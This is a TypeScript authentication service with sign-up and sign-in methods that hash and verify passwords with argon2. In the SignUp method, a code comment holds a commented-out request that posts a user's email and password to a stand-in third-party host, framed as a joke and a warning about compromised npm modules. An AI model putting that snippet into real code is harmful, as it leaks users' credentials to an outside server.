import { Service, Inject } from 'typedi';
import MailerService from './mailer';
import config from '../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';
import { IUserSignUpBody, Role } from '../interfaces/user';
import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
import events from '../subscribers/events';
import { getRepository, Repository } from 'typeorm';
import { User } from '../entity/user';

@Service()
export default class AuthService {
  userRepository: Repository<User>;

  constructor(
    // private mailer: MailerService,
    @Inject('logger') private logger,
    @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) {
    this.userRepository = getRepository(User);
  }

  public async SignUp(userInputDTO: IUserSignUpBody): Promise<{ user: User }> {
    try {
      const salt = randomBytes(32);

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      const userExist = await this.userRepository.findOne({ email: userInputDTO.email });
      if (userExist) {
        throw new Error('This email already used');
      }

      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
      this.logger.silly('Creating user db record');

      const userRecord = await this.userRepository
        .create({
          email: userInputDTO.email,
          salt: salt.toString('hex'),
          password: hashedPassword,
          role: Role.User,
        })
        .save();

      if (!userRecord) {
        throw new Error('User cannot be created');
      }
      this.logger.silly('Sending welcome email');
      // await this.mailer.SendWelcomeEmail(userRecord);

      this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const user = userRecord;
      Reflect.deleteProperty(user, 'password');
      Reflect.deleteProperty(user, 'salt');
      return { user };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async SignIn(email: string, password: string, cb: Function) {
    const userRecord = await this.userRepository.findOne({ email });
    if (!userRecord) {
      return cb(null, false);
    }

    this.logger.silly('Checking password');
    const validPassword = await argon2.verify(userRecord.password, password);
    if (validPassword) {
      this.logger.silly('Password is valid!');
      const user = userRecord;
      Reflect.deleteProperty(user, 'password');
      Reflect.deleteProperty(user, 'salt');

      if (user.emailConfirmed === false) {
        return cb(new Error("Email didn't confirm"));
      }

      return cb(null, user);
    } else {
      return cb(null, false);
    }
  }
}
